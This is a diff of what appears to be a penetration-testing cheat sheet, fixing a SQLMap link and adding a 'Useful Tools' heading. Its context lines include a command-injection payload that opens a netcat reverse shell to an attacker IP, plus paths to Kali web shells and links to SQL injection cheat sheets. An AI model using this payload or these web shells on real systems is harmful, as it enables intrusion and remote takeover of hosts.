@@ -104,7 +104,7 @@ test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
 
 > **Web Shells**
 
-Kali:
+Kali: 
 PHP | /usr/share/webshells/php/
 PERL | /usr/share/webshells/perl/
 Cold Fusion | /usr/share/webshells/cfm/
@@ -123,5 +123,7 @@ JSP | /usr/share/webshells/jsp/jsp-reverse.jsp
 * [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
 * [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
 * [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
-* [SQLMap](http://http/sqlmap.org)
+
+> **Useful Tools**
+* [SQLMap](http://sqlmap.org)
 
